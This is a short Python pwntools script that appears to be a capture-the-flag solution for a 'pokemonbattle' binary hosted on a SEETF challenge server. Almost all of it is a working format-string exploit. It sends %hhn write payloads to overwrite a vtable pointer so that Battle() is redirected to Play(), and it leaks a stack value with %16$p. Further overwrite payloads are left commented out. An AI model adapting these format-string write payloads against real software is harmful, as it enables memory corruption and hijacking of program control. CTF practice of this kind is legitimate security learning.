from pwn import *
from sys import *

context.log_level = 'warning'
elf = context.binary = ELF("./pokemonbattle")
p = process("./pokemonbattle")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'fun.chall.seetf.sg'
PORT = 50005

cmd = """
b*0x555555555274
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

#overwrite vtable Batle() to Play()
payload = f"%{0x70}c"
payload += "%7$hhn"
p.sendline(payload)

#overwrite
payload = f"%{0x78}c"
payload += "%8$hhn"
p.sendline(payload)

p.sendline("%16$p")
#

# #gdb.attach(p,cmd)
# payload = f"%{0xc6}c"
# payload += "%16$hhn"
# p.sendline(payload)


# payload = f"%{0x68}c"
# payload += "%7$hhn"
# p.sendline(payload)
p.interactive()